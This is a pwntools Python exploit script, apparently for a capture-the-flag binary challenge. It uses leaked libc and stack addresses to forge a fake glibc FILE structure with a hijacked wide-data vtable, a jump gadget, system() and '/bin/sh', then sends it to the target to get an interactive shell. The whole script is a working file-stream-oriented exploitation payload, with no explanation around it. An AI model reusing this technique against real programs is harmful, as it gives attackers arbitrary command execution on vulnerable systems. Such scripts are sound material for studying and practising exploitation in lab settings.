#!/usr/bin/env python3
from pwn import *

exe = ELF("./a.oute")
# context.log_level='debug'
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")
context.terminal = ["foot"]
if args.REMOTE:
    p = remote("addr", 1337)
else:
    p = process([exe.path])
    # input()
    gdb.attach(p, """

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
p.recvuntil("libc: ")
libcs = int(p.recvuntil(b"\n",drop=True),16)
libc.address = libcs - libc.sym['_IO_2_1_stdout_']
log.info(f"libc.adress: {hex(libc.address)}")
p.recvuntil(b"stack: ")
stack = int(p.recvuntil(b"\n",drop=True),16)
# vtable =0x404460
# log.info(f"vtable: {hex(vtable)}")
log.info(f"stack: {hex(stack)}")
###################################forging
context.clear(arch='amd64')
# some constants
stdout_lock = libc.sym["_IO_stdfile_1_lock"]	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x0000000000163830 # add rdi, 0x10 ; jmp rcx
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 32
fake._wide_data = libc.sym["_IO_wide_data_1"]
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
payload = bytes(fake)+b"the end of the forge"
sa(b"there",payload)






p.interactive()
# good luck pwning :)

